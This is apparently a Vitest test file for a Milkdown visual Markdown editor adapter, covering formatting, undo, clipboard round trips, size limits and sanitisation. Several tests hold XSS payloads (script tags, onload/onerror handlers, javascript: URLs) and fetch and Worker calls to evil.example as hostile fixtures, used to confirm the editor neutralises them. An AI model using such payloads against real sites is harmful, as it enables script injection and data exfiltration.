import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { mount } from "@vue/test-utils";
import { MAX_MARKDOWN_BYTES } from "@glyphquire/api-contract";
import { createDocumentEngine, semanticNormalize } from "@glyphquire/document-engine";
import { editorViewCtx, type Editor } from "@milkdown/kit/core";
import { Fragment, Slice } from "@milkdown/kit/prose/model";
import { undo } from "@milkdown/kit/prose/history";
import { AllSelection, TextSelection } from "@milkdown/kit/prose/state";
import type { EditorView } from "@milkdown/kit/prose/view";
import VisualEditor from "../../components/visual/VisualEditor.vue";
import { MilkdownVisualAdapter } from "./MilkdownVisualAdapter.js";
import { BLOCK_COMMANDS } from "../../components/workbench/markdown-format.js";
import type { VisualAssetResolver } from "./asset-resolver.js";
import {
  blockWarningAttrsFromSource,
  GLYPHQUIRE_FRONTMATTER,
  inlineWarningAttrsFromSource,
  resolveVisualUrl,
} from "./schema.js";

const engine = createDocumentEngine();
const fixturesRoot = resolve(process.cwd(), "../../packages/document-engine/tests/fixtures");
const UTF8_ENCODER = new TextEncoder();

function fixture(group: string, name: string): string {
  return readFileSync(resolve(fixturesRoot, group, name, "input.md"), "utf8");
}

async function mountedAdapter(markdown?: string) {
  const host = document.createElement("div");
  host.dataset.glyphquireTestHost = "";
  document.body.appendChild(host);
  const adapter = new MilkdownVisualAdapter();
  adapter.mount(host);
  await adapter.whenReady();
  if (markdown !== undefined) adapter.setMarkdown(markdown);
  return { adapter, host };
}

async function nextListenerFlush(): Promise<void> {
  await new Promise((resolve) => setTimeout(resolve, 250));
}

function proseMirrorView(adapter: MilkdownVisualAdapter): EditorView {
  const editor = (adapter as unknown as { editor: Editor | undefined }).editor;
  if (!editor) throw new Error("expected a ready Milkdown editor");
  return editor.action((ctx) => ctx.get(editorViewCtx));
}

function serializeAllForClipboard(adapter: MilkdownVisualAdapter): {
  readonly html: string;
  readonly text: string;
} {
  const view = proseMirrorView(adapter);
  view.dispatch(view.state.tr.setSelection(new AllSelection(view.state.doc)));
  const serialized = view.serializeForClipboard(view.state.selection.content());
  return { html: serialized.dom.innerHTML, text: serialized.text };
}

function warningNodeCount(adapter: MilkdownVisualAdapter): number {
  let count = 0;
  proseMirrorView(adapter).state.doc.descendants((node) => {
    if (node.type.name === "gq_inline_warning" || node.type.name === "gq_warning") count += 1;
  });
  return count;
}

function warningMarkerHtml(kind: "inline" | "block", source: string, marker = "escaped"): string {
  const element = document.createElement(kind === "inline" ? "span" : "section");
  element.setAttribute(
    kind === "inline" ? "data-glyphquire-inline-warning" : "data-glyphquire-warning",
    marker,
  );
  element.textContent = source;
  return element.outerHTML;
}

function utf8Length(value: string): number {
  return UTF8_ENCODER.encode(value).byteLength;
}

function exactLimitWarningMarkdown(
  kind: "inline" | "block",
  filler: string,
  targetBytes = MAX_MARKDOWN_BYTES,
): string {
  const bodyPrefix = kind === "inline" ? ":future[" : ":::future\n";
  const bodySuffix = kind === "inline" ? "]\n" : "\n:::\n";
  const fixedBytes = utf8Length(`${GLYPHQUIRE_FRONTMATTER}${bodyPrefix}${bodySuffix}`);
  const fillerBytes = utf8Length(filler);
  const availableBytes = targetBytes - fixedBytes;
  const repetitions = Math.floor(availableBytes / fillerBytes);
  const asciiRemainder = availableBytes - repetitions * fillerBytes;
  const markdown = `${GLYPHQUIRE_FRONTMATTER}${bodyPrefix}${filler.repeat(repetitions)}${"a".repeat(asciiRemainder)}${bodySuffix}`;
  if (utf8Length(markdown) !== targetBytes) throw new Error("failed to build exact-size Markdown");
  return markdown;
}

function warningSource(markdown: string, kind: "inline" | "block"): string {
  const body = markdown.slice(GLYPHQUIRE_FRONTMATTER.length);
  return kind === "inline" ? body.replace(/\n$/, "") : body;
}

describe("MilkdownVisualAdapter", () => {
  const cleanups: Array<() => void> = [];

  afterEach(() => {
    while (cleanups.length > 0) cleanups.pop()?.();
    vi.restoreAllMocks();
    vi.unstubAllGlobals();
    for (const host of document.querySelectorAll("[data-glyphquire-test-host]")) host.remove();
    delete (globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel;
    delete (globalThis as Record<string, unknown>).__glyphquireImportSpy;
  });

  it("mounts Milkdown behind the EditorAdapter seam and focuses its ProseMirror surface", async () => {
    const { adapter, host } = await mountedAdapter();
    cleanups.push(() => adapter.destroy());

    expect(host.querySelector(".milkdown .ProseMirror")).not.toBeNull();
    adapter.focus();
    expect(document.activeElement).toBe(host.querySelector(".ProseMirror"));
  });

  it("applies visual toolbar formatting through one native ProseMirror transaction", async () => {
    const markdown = ["---", "glyphquire-spec: 1", "---", "", "Hello", ""].join("\n");
    const { adapter } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());
    const view = proseMirrorView(adapter);
    view.dispatch(view.state.tr.setSelection(TextSelection.create(view.state.doc, 1, 6)));
    const dispatch = vi.spyOn(view, "dispatch");

    expect(adapter.applyVisualToolbarAction("bold")).toBe(true);
    expect(dispatch).toHaveBeenCalledTimes(1);
    expect(adapter.getMarkdown()).toContain("**Hello**");
  });

  it("keeps one undo step for a visual toolbar action", async () => {
    const markdown = ["---", "glyphquire-spec: 1", "---", "", "Hello", ""].join("\n");
    const { adapter } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());
    const view = proseMirrorView(adapter);
    view.dispatch(view.state.tr.setSelection(TextSelection.create(view.state.doc, 1, 6)));

    expect(adapter.applyVisualToolbarAction("bold")).toBe(true);
    expect(adapter.getMarkdown()).toContain("**Hello**");
    expect(undo(view.state, view.dispatch.bind(view))).toBe(true);
    expect(adapter.getMarkdown()).not.toContain("**Hello**");
    expect(undo(view.state, view.dispatch.bind(view))).toBe(false);
  });

  it("uses native block transactions for heading and list toolbar actions", async () => {
    const markdown = ["---", "glyphquire-spec: 1", "---", "", "Hello", ""].join("\n");
    const { adapter } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());
    const view = proseMirrorView(adapter);
    view.dispatch(view.state.tr.setSelection(TextSelection.create(view.state.doc, 1, 6)));

    expect(adapter.applyVisualToolbarAction("heading")).toBe(true);
    expect(adapter.getMarkdown()).toContain("## Hello");
    view.dispatch(view.state.tr.setSelection(TextSelection.create(view.state.doc, 1, 6)));
    expect(adapter.applyVisualToolbarAction("bulletList")).toBe(true);
    expect(adapter.getMarkdown()).toContain("- Hello");
  });

  it("detects an empty-paragraph slash and replaces its native range", async () => {
    const markdown = ["---", "glyphquire-spec: 1", "---", "", "", ""].join("\n");
    const { adapter } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());
    const listener = vi.fn();
    adapter.onSlashCommand(listener);
    adapter.onChange(() => undefined);
    const view = proseMirrorView(adapter);
    view.dispatch(view.state.tr.insertText("/", 1));
    await nextListenerFlush();

    expect(listener).toHaveBeenCalledOnce();
    const request = listener.mock.calls[0][0];
    expect(request.query).toBe("");
    expect(request.slashRange.to - request.slashRange.from).toBe(1);
    // The wrapper may project the same canonical source after the session
    // receives the slash update; that must not discard the native range.
    adapter.setMarkdown(adapter.getMarkdown());
    expect(adapter.replaceRange(request.slashRange.from, request.slashRange.to, "## ", 3)).toBe(
      true,
    );
    expect(adapter.getMarkdown()).toContain("##");
  });

  it("inserts the explicit code block command through the native visual transaction", async () => {
    const markdown = ["---", "glyphquire-spec: 1", "---", "", "", ""].join("\n");
    const { adapter } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());
    const listener = vi.fn();
    adapter.onSlashCommand(listener);
    const view = proseMirrorView(adapter);
    view.dispatch(view.state.tr.insertText("/", 1));
    await nextListenerFlush();
    const request = listener.mock.calls[0][0];

    expect(
      adapter.replaceRange(
        request.slashRange.from,
        request.slashRange.to,
        BLOCK_COMMANDS[3].markdown,
        BLOCK_COMMANDS[3].cursorOffset,
      ),
    ).toBe(true);
    expect(adapter.getMarkdown()).toContain("```");
  });

  it("accepts an empty visual list item and suppresses slash discovery in code", async () => {
    const listMarkdown = ["---", "glyphquire-spec: 1", "---", "", "- ", ""].join("\n");
    const list = await mountedAdapter(listMarkdown);
    cleanups.push(() => list.adapter.destroy());
    const listListener = vi.fn();
    list.adapter.onSlashCommand(listListener);
    const listView = proseMirrorView(list.adapter);
    listView.dispatch(listView.state.tr.insertText("/"));
    await nextListenerFlush();
    expect(listListener).toHaveBeenCalledOnce();

    const codeMarkdown = ["---", "glyphquire-spec: 1", "---", "", "```", "", "```", ""].join("\n");
    const code = await mountedAdapter(codeMarkdown);
    cleanups.push(() => code.adapter.destroy());
    const codeListener = vi.fn();
    code.adapter.onSlashCommand(codeListener);
    const codeView = proseMirrorView(code.adapter);
    codeView.dispatch(codeView.state.tr.insertText("/"));
    await nextListenerFlush();
    expect(codeListener).not.toHaveBeenCalled();
  });

  it("silently projects authoritative Markdown and preserves semantic AST", async () => {
    const markdown = fixture("callout", "valid-full");
    const { adapter } = await mountedAdapter();
    cleanups.push(() => adapter.destroy());
    const listener = vi.fn();
    adapter.onChange(listener);

    adapter.setMarkdown(markdown);
    await nextListenerFlush();

    const before = engine.parse(markdown);
    const after = engine.parse(adapter.getMarkdown());
    expect(before.ok).toBe(true);
    expect(after.ok).toBe(true);
    if (!before.ok || !after.ok) throw new Error("expected accepted documents");
    expect(semanticNormalize(after.document)).toEqual(semanticNormalize(before.document));
    expect(listener).not.toHaveBeenCalled();
  });

  it("rejects a fatal projection without replacing the last accepted Markdown", async () => {
    const accepted = fixture("sticky", "valid-minimal");
    const { adapter } = await mountedAdapter(accepted);
    cleanups.push(() => adapter.destroy());

    expect(() => adapter.setMarkdown("# Missing spec marker")).toThrow(
      "Visual projection requires accepted GlyphQuire Markdown",
    );
    expect(engine.parse(adapter.getMarkdown()).ok).toBe(true);
    expect(adapter.getMarkdown()).toBe(engine.serialize(engine.parse(accepted).document!));
  });

  it("blocks user control edits while read-only and emits one canonical change when writable", async () => {
    const { adapter, host } = await mountedAdapter(fixture("p5", "valid-minimal"));
    cleanups.push(() => adapter.destroy());
    const listener = vi.fn();
    adapter.onChange(listener);
    const source = host.querySelector<HTMLTextAreaElement>("[data-glyphquire-runtime-source]");
    expect(source).not.toBeNull();

    adapter.setReadOnly(true);
    expect(source?.disabled).toBe(true);
    if (source) {
      source.value = "globalThis.READ_ONLY_FORGED = true";
      source.dispatchEvent(new Event("change", { bubbles: true }));
    }
    await nextListenerFlush();
    expect(adapter.getMarkdown()).not.toContain("READ_ONLY_FORGED");
    expect(listener).not.toHaveBeenCalled();

    adapter.setReadOnly(false);
    expect(source?.disabled).toBe(false);
    if (source) {
      source.value = "function setup() { createCanvas(10, 10); }";
      source.dispatchEvent(new Event("change", { bubbles: true }));
    }
    await nextListenerFlush();
    expect(adapter.getMarkdown()).toContain("createCanvas(10, 10)");
    expect(listener).toHaveBeenCalledTimes(1);
  });

  it("renders valid tabs and columns in source order and admits only legal structural children", async () => {
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      "::::tabs",
      ':::tab{title="First"}',
      "Alpha",
      ":::",
      ':::tab{title="Second"}',
      "Beta",
      ":::",
      "::::",
      "",
      '::::columns{count="2"}',
      ":::column",
      "Left",
      ":::",
      ":::column",
      "Right",
      ":::",
      "::::",
      "",
    ].join("\n");
    const { adapter, host } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());

    expect(
      [...host.querySelectorAll("[data-glyphquire-node='tab']")].map((node) =>
        node.querySelector("[data-glyphquire-tab-title]")?.getAttribute("value"),
      ),
    ).toEqual(["First", "Second"]);
    expect(
      [...host.querySelectorAll("[data-glyphquire-node='column']")].map(
        (node) => node.textContent?.includes("Left") || node.textContent?.includes("Right"),
      ),
    ).toEqual([true, true]);
    expect(adapter.canContainForTests("tabs", "tab")).toBe(true);
    expect(adapter.canContainForTests("tabs", "paragraph")).toBe(false);
    expect(adapter.canContainForTests("columns", "column")).toBe(true);
    expect(adapter.canContainForTests("columns", "tab")).toBe(false);
  });

  it("escapes raw HTML and unknown or invalid blocks into lossless warning nodes", async () => {
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      '<script>globalThis.__glyphquireRuntimeSentinel = "script"</script>',
      "",
      "<svg onload=\"globalThis.__glyphquireRuntimeSentinel = 'svg'\"></svg>",
      "",
      ':::future{x="1" handler="<img src=x onerror=boom()>"}',
      "Keep **every** child.",
      ":::",
      "",
      ':::callout{type="critical" handler="<script>boom()</script>"}',
      "Invalid child.",
      ":::",
      "",
    ].join("\n");
    const { adapter, host } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());

    expect(host.querySelectorAll("[data-glyphquire-warning]").length).toBeGreaterThanOrEqual(4);
    expect(host.querySelector("script, svg, iframe, [onload], [onerror]")).toBeNull();
    expect(host.textContent).toContain("<script>");
    expect(host.textContent).toContain("future");
    expect(host.textContent).toContain("handler");

    const before = engine.parse(markdown);
    const after = engine.parse(adapter.getMarkdown());
    expect(before.ok).toBe(true);
    expect(after.ok).toBe(true);
    if (!before.ok || !after.ok) throw new Error("expected recoverable documents");
    expect(semanticNormalize(after.document)).toEqual(semanticNormalize(before.document));
  });

  it("losslessly escapes an accepted inline text directive", async () => {
    const markdown = ["---", "glyphquire-spec: 1", "---", "", 'A :future[child]{a="1"} B', ""].join(
      "\n",
    );
    const before = engine.parse(markdown);
    expect(before.ok).toBe(true);
    if (!before.ok) throw new Error("expected accepted inline directive Markdown");

    const { adapter, host } = await mountedAdapter();
    cleanups.push(() => adapter.destroy());
    expect(() => adapter.setMarkdown(markdown)).not.toThrow();

    const warning = host.querySelector("[data-glyphquire-inline-warning]");
    expect(warning?.textContent).toContain(':future[child]{a="1"}');
    expect(host.querySelector("script, svg, iframe, [onerror], [onload]")).toBeNull();

    const after = engine.parse(adapter.getMarkdown());
    expect(after.ok).toBe(true);
    if (!after.ok) throw new Error("expected accepted visual inline directive output");
    expect(semanticNormalize(after.document)).toEqual(semanticNormalize(before.document));
  });

  it("round-trips escaped inline and block warnings through the real clipboard DOM", async () => {
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      'A :future[child]{a="1"} B',
      "",
      ':::future{x="1"}',
      "Keep **every** child.",
      ":::",
      "",
    ].join("\n");
    const source = await mountedAdapter(markdown);
    const target = await mountedAdapter();
    cleanups.push(
      () => source.adapter.destroy(),
      () => target.adapter.destroy(),
    );

    const clipboard = serializeAllForClipboard(source.adapter);
    expect(clipboard.html).toContain("data-glyphquire-inline-warning");
    expect(clipboard.html).toContain("data-glyphquire-warning");
    expect(clipboard.text).toContain(':future[child]{a="1"}');
    expect(clipboard.text).toContain(':::future{x="1"}');
    expect(proseMirrorView(target.adapter).pasteHTML(clipboard.html)).toBe(true);

    const before = engine.parse(markdown);
    const after = engine.parse(target.adapter.getMarkdown());
    expect(before.ok).toBe(true);
    expect(after.ok).toBe(true);
    if (!before.ok || !after.ok) throw new Error("expected accepted clipboard documents");
    expect(semanticNormalize(after.document)).toEqual(semanticNormalize(before.document));
  });

  it("rejects forged warning markers without creating serializer-poisoning nodes", async () => {
    (globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel = 0;
    const malformedMarkers = [
      '<span data-glyphquire-inline-warning="escaped"></span>',
      '<section data-glyphquire-warning="escaped"></section>',
      '<span data-glyphquire-inline-warning>:future[child]{a="1"}</span>',
      "<section data-glyphquire-warning>:::future\nchild\n:::\n</section>",
      '<span data-glyphquire-inline-warning="forged">:future[child]{a="1"}</span>',
      '<section data-glyphquire-warning="forged">:::future\nchild\n:::\n</section>',
      '<span data-glyphquire-inline-warning="escaped" data-directive-json="{]">not a directive</span>',
      '<section data-glyphquire-warning="escaped" data-semantic-json="{]">not a block</section>',
      warningMarkerHtml("inline", ':::future{x="1"}\nchild\n:::\n'),
      warningMarkerHtml("block", ':future[child]{a="1"}'),
      warningMarkerHtml("inline", ':future[child]{a="1"}\n'),
      warningMarkerHtml("block", ":::future\nchild\n:::"),
      '<span data-glyphquire-inline-warning="escaped"><b>:future[child]{a="1"}</b></span>',
      '<section data-glyphquire-warning="escaped"><script>globalThis.__glyphquireRuntimeSentinel = 1</script></section>',
      warningMarkerHtml("inline", "é".repeat(MAX_MARKDOWN_BYTES / 2 + 1)),
      warningMarkerHtml("block", "x".repeat(MAX_MARKDOWN_BYTES + 1)),
      warningMarkerHtml("inline", "x".repeat(MAX_MARKDOWN_BYTES + 1), "forged"),
    ];

    for (const marker of malformedMarkers) {
      const { adapter } = await mountedAdapter();
      cleanups.push(() => adapter.destroy());
      expect(() => proseMirrorView(adapter).pasteHTML(marker)).not.toThrow();
      expect(warningNodeCount(adapter)).toBe(0);
      expect(() => adapter.getMarkdown()).not.toThrow();
      expect((globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel).toBe(0);
      adapter.destroy();
    }
  });

  it("reconstructs canonical pasted warning source without trusting DOM JSON attributes", async () => {
    const sentinel = vi.fn();
    (globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel = sentinel;
    const cases = [
      {
        kind: "inline" as const,
        source: ':future[child]{a="1" handler="<img src=x onerror=boom()>"}',
      },
      {
        kind: "block" as const,
        source: [
          ':::future{x="1" handler="<script>boom()</script>"}',
          "Keep **every** child.",
          "<script>globalThis.__glyphquireRuntimeSentinel()</script>",
          ":::",
          "",
        ].join("\n"),
      },
    ];

    for (const item of cases) {
      const expected = engine.parse(`${GLYPHQUIRE_FRONTMATTER}${item.source}`);
      expect(expected.ok).toBe(true);
      if (!expected.ok) throw new Error("expected accepted canonical attacker source");
      const canonicalBody = engine
        .serialize(expected.document)
        .slice(GLYPHQUIRE_FRONTMATTER.length);
      const canonicalSource =
        item.kind === "inline" ? canonicalBody.replace(/\n+$/, "") : canonicalBody;
      const container = document.createElement(item.kind === "inline" ? "span" : "section");
      container.setAttribute(
        item.kind === "inline" ? "data-glyphquire-inline-warning" : "data-glyphquire-warning",
        "escaped",
      );
      container.setAttribute("data-semantic-json", '{"type":"script","value":"forged"}');
      container.setAttribute("data-source", "forged");
      container.setAttribute("onmouseover", "globalThis.__glyphquireRuntimeSentinel()");
      container.textContent = canonicalSource;

      const { adapter, host } = await mountedAdapter();
      cleanups.push(() => adapter.destroy());
      expect(proseMirrorView(adapter).pasteHTML(container.outerHTML)).toBe(true);
      expect(warningNodeCount(adapter)).toBe(1);
      expect(
        host.querySelector("script, svg, iframe, [onerror], [onload], [onmouseover]"),
      ).toBeNull();
      expect(sentinel).not.toHaveBeenCalled();

      const actual = engine.parse(adapter.getMarkdown());
      expect(actual.ok).toBe(true);
      if (!actual.ok) throw new Error("expected accepted pasted warning source");
      expect(semanticNormalize(actual.document)).toEqual(semanticNormalize(expected.document));
      adapter.destroy();
    }
  });

  it("fails closed when invalid warning attrs are inserted or exported programmatically", async () => {
    const { adapter } = await mountedAdapter();
    cleanups.push(() => adapter.destroy());
    const view = proseMirrorView(adapter);
    const inlineType = view.state.schema.nodes.gq_inline_warning;
    const blockType = view.state.schema.nodes.gq_warning;
    if (!inlineType || !blockType) throw new Error("expected warning node schemas");

    const missingInline = inlineType.create();
    const missingBlock = blockType.create();
    expect(() => missingInline.check()).toThrow();
    expect(() => missingBlock.check()).toThrow();

    const invalidInline = inlineType.create({ directiveJson: "", source: "" });
    const invalidBlock = blockType.create({
      semanticJson: "{}",
      source: "",
      label: "Unsupported block",
    });
    expect(() => invalidInline.check()).toThrow();
    expect(() => invalidBlock.check()).toThrow();
    expect(() =>
      view.serializeForClipboard(new Slice(Fragment.from(invalidInline), 0, 0)),
    ).toThrow();
    expect(() =>
      view.serializeForClipboard(new Slice(Fragment.from(invalidBlock), 0, 0)),
    ).toThrow();

    const before = view.state.doc.toJSON();
    view.dispatch(view.state.tr.replaceSelectionWith(invalidInline));
    expect(view.state.doc.toJSON()).toEqual(before);
    view.dispatch(view.state.tr.replaceSelectionWith(invalidBlock));
    expect(view.state.doc.toJSON()).toEqual(before);
    expect(() => adapter.getMarkdown()).not.toThrow();

    const inlineOne = inlineWarningAttrsFromSource(":future[one]");
    const inlineTwo = inlineWarningAttrsFromSource(":future[two]");
    const blockOne = blockWarningAttrsFromSource(":::future\none\n:::\n");
    const blockTwo = blockWarningAttrsFromSource(":::other\ntwo\n:::\n");
    if (!inlineOne || !inlineTwo || !blockOne || !blockTwo) {
      throw new Error("expected canonical warning attrs");
    }
    const mismatchedInline = inlineType.create({
      directiveJson: inlineOne.directiveJson,
      source: inlineTwo.source,
    });
    const mismatchedBlock = blockType.create({
      semanticJson: blockOne.semanticJson,
      source: blockTwo.source,
      label: blockOne.label,
    });
    expect(() => mismatchedInline.check()).not.toThrow();
    expect(() => mismatchedBlock.check()).not.toThrow();
    expect(() =>
      view.serializeForClipboard(new Slice(Fragment.from(mismatchedInline), 0, 0)),
    ).toThrow();
    expect(() =>
      view.serializeForClipboard(new Slice(Fragment.from(mismatchedBlock), 0, 0)),
    ).toThrow();
    view.dispatch(view.state.tr.replaceSelectionWith(mismatchedInline));
    view.dispatch(view.state.tr.replaceSelectionWith(mismatchedBlock));
    expect(view.state.doc.toJSON()).toEqual(before);
  });

  it.each(["inline", "block"] as const)(
    "projects an exact 2 MiB control-character %s warning without a JSON multiplier cap",
    async (kind) => {
      const markdown = exactLimitWarningMarkdown(kind, "\u0001");
      const expected = engine.parse(markdown);
      expect(utf8Length(markdown)).toBe(MAX_MARKDOWN_BYTES);
      expect(expected.ok).toBe(true);
      if (!expected.ok) throw new Error("expected exact-limit warning Markdown");
      expect(engine.serialize(expected.document)).toBe(markdown);

      const { adapter } = await mountedAdapter();
      cleanups.push(() => adapter.destroy());
      expect(() => adapter.setMarkdown(markdown)).not.toThrow();
      const projected = adapter.getMarkdown();
      const actual = engine.parse(projected);
      expect(utf8Length(projected)).toBe(MAX_MARKDOWN_BYTES);
      expect(actual.ok).toBe(true);
      if (!actual.ok) throw new Error("expected exact-limit projected Markdown");
      expect(semanticNormalize(actual.document)).toEqual(semanticNormalize(expected.document));
    },
    120_000,
  );

  it.each([
    { kind: "inline" as const, filler: "a" },
    { kind: "block" as const, filler: "é" },
  ])(
    "accepts exact-limit $kind warning source with $filler filler",
    ({ kind, filler }) => {
      const markdown = exactLimitWarningMarkdown(kind, filler);
      const source = warningSource(markdown, kind);
      const attrs =
        kind === "inline"
          ? inlineWarningAttrsFromSource(source)
          : blockWarningAttrsFromSource(source);
      expect(utf8Length(markdown)).toBe(MAX_MARKDOWN_BYTES);
      expect(attrs).not.toBeNull();
    },
    60_000,
  );

  it("derives token-dense structural JSON from source instead of guessing an expansion cap", () => {
    const markdown = exactLimitWarningMarkdown("block", ":future[x]", 64 * 1024);
    const source = warningSource(markdown, "block");
    const attrs = blockWarningAttrsFromSource(source);
    expect(attrs).not.toBeNull();
    expect(attrs?.semanticJson.length).toBeGreaterThan(source.length * 20);
  }, 60_000);

  it("rejects 2 MiB plus one byte without corrupting the prior projection", async () => {
    const accepted = fixture("sticky", "valid-minimal");
    const overLimit = exactLimitWarningMarkdown("inline", "a", MAX_MARKDOWN_BYTES + 1);
    const overLimitBlock = exactLimitWarningMarkdown("block", "a", MAX_MARKDOWN_BYTES + 1);
    const canonicalExpansion = overLimit.slice(0, -1);
    const { adapter } = await mountedAdapter(accepted);
    cleanups.push(() => adapter.destroy());
    const before = adapter.getMarkdown();

    expect(utf8Length(overLimit)).toBe(MAX_MARKDOWN_BYTES + 1);
    expect(inlineWarningAttrsFromSource(warningSource(overLimit, "inline"))).toBeNull();
    expect(blockWarningAttrsFromSource(warningSource(overLimitBlock, "block"))).toBeNull();
    expect(() => adapter.setMarkdown(overLimit)).toThrow();
    expect(utf8Length(canonicalExpansion)).toBe(MAX_MARKDOWN_BYTES);
    const expanded = engine.parse(canonicalExpansion);
    expect(expanded.ok).toBe(true);
    if (!expanded.ok) throw new Error("expected canonical-expansion control Markdown");
    expect(utf8Length(engine.serialize(expanded.document))).toBe(MAX_MARKDOWN_BYTES + 1);
    expect(() => adapter.setMarkdown(canonicalExpansion)).toThrow();
    expect(adapter.getMarkdown()).toBe(before);
  }, 60_000);

  it("rejects huge or mismatched warning JSON before parsing attacker-controlled JSON", async () => {
    const { adapter } = await mountedAdapter();
    cleanups.push(() => adapter.destroy());
    const view = proseMirrorView(adapter);
    const inlineType = view.state.schema.nodes.gq_inline_warning;
    const blockType = view.state.schema.nodes.gq_warning;
    const inline = inlineWarningAttrsFromSource(":future[x]");
    const block = blockWarningAttrsFromSource(":::future\nx\n:::\n");
    if (!inlineType || !blockType || !inline || !block) {
      throw new Error("expected canonical warning schemas and attrs");
    }
    const sameLengthMalformedInline = `[${inline.directiveJson.slice(1)}`;
    const hugeBlockJson = "x".repeat(MAX_MARKDOWN_BYTES * 8);
    const malformedInline = inlineType.create({
      directiveJson: sameLengthMalformedInline,
      source: inline.source,
    });
    const hugeBlock = blockType.create({
      semanticJson: hugeBlockJson,
      source: block.source,
      label: block.label,
    });
    const parseSpy = vi.spyOn(JSON, "parse");
    const before = view.state.doc.toJSON();

    expect(() =>
      view.serializeForClipboard(new Slice(Fragment.from(malformedInline), 0, 0)),
    ).toThrow();
    expect(() => view.serializeForClipboard(new Slice(Fragment.from(hugeBlock), 0, 0))).toThrow();
    view.dispatch(view.state.tr.replaceSelectionWith(malformedInline));
    view.dispatch(view.state.tr.replaceSelectionWith(hugeBlock));
    expect(parseSpy).not.toHaveBeenCalled();
    expect(view.state.doc.toJSON()).toEqual(before);
    expect(() => adapter.getMarkdown()).not.toThrow();
  }, 60_000);

  it("removes hostile rendered URL sinks and hardens safe external links", async () => {
    const openSpy = vi.spyOn(window, "open").mockImplementation(() => null);
    const fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      "[Hostile link](javascript:globalThis.__glyphquireRuntimeSentinel=1)",
      "",
      "![Hostile image](data:image/svg+xml,%3Csvg%20onload%3Dalert(1)%3E)",
      "",
      "[Safe external](https://docs.example/guide)",
      "",
    ].join("\n");
    const { adapter, host } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());

    const hostileLink = [...host.querySelectorAll("a")].find(
      (link) => link.textContent === "Hostile link",
    );
    const safeLink = [...host.querySelectorAll("a")].find(
      (link) => link.textContent === "Safe external",
    );
    const hostileImage = host.querySelector<HTMLImageElement>('img[alt="Hostile image"]');

    expect(hostileLink?.hasAttribute("href")).toBe(false);
    expect(hostileImage?.hasAttribute("src")).toBe(false);
    expect(safeLink?.getAttribute("href")).toBe("https://docs.example/guide");
    expect(safeLink?.getAttribute("target")).toBe("_blank");
    expect(safeLink?.getAttribute("rel")).toBe("noopener noreferrer");

    hostileLink?.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
    expect((globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel).toBeUndefined();
    expect(openSpy).not.toHaveBeenCalled();
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("renders only canonical asset references through the owned async resolver seam", async () => {
    const release = vi.fn();
    const resolver: VisualAssetResolver = {
      resolve: vi.fn(async () => ({
        src: "blob:https://app.glyphquire.test/asset-image",
        mimeType: "image/png",
        release,
      })),
    };
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      "![Managed](asset://33333333-3333-4333-8333-333333333333)",
      "",
      "![Remote](https://evil.example/tracker.png)",
      "",
    ].join("\n");
    const host = document.createElement("div");
    host.dataset.glyphquireTestHost = "";
    document.body.appendChild(host);
    const adapter = new MilkdownVisualAdapter({ assetResolver: resolver });
    adapter.mount(host);
    cleanups.push(() => adapter.destroy());
    await adapter.whenReady();
    adapter.setMarkdown(markdown);

    const managed = host.querySelector<HTMLImageElement>('img[alt="Managed"]');
    const remote = host.querySelector<HTMLImageElement>('img[alt="Remote"]');
    await vi.waitFor(() => {
      expect(managed?.getAttribute("src")).toBe("blob:https://app.glyphquire.test/asset-image");
    });
    expect(resolver.resolve).toHaveBeenCalledOnce();
    expect(resolver.resolve).toHaveBeenCalledWith("asset://33333333-3333-4333-8333-333333333333");
    expect(remote?.hasAttribute("src")).toBe(false);
    expect(adapter.getMarkdown()).toContain("asset://33333333-3333-4333-8333-333333333333");

    managed?.dispatchEvent(new Event("load"));
    expect(release).toHaveBeenCalledOnce();
  });

  it("keeps p5 and canvas source entirely inert with no execution or capability calls", async () => {
    const fetchSpy = vi.fn();
    const workerSpy = vi.fn();
    const openSpy = vi.spyOn(window, "open").mockImplementation(() => null);
    const importSpy = vi.fn();
    const createElement = document.createElement.bind(document);
    const activeElementSpy = vi.spyOn(document, "createElement").mockImplementation(((
      tagName: string,
      options?: ElementCreationOptions,
    ) => {
      if (["script", "iframe", "object", "embed"].includes(tagName.toLowerCase())) {
        throw new Error(`active element requested: ${tagName}`);
      }
      return createElement(tagName, options);
    }) as typeof document.createElement);
    vi.stubGlobal("fetch", fetchSpy);
    vi.stubGlobal("Worker", workerSpy);
    (globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel = 0;
    (globalThis as Record<string, unknown>).__glyphquireImportSpy = importSpy;

    const source = [
      "globalThis.__glyphquireRuntimeSentinel += 1;",
      'document.body.append(document.createElement("iframe"));',
      'window.open("https://evil.example/");',
      'fetch("https://evil.example/exfil");',
      'new Worker("https://evil.example/worker.js");',
      'import("data:text/javascript,globalThis.__glyphquireImportSpy()")',
    ].join("\n");
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      ':::p5{height="400" network="javascript:alert(1)" autoplay="true"}',
      "```js",
      source,
      "```",
      ":::",
      "",
      ':::canvas{height="200" network="//evil.example/x"}',
      "```js",
      source,
      "```",
      ":::",
      "",
    ].join("\n");

    const { adapter, host } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());
    await nextListenerFlush();

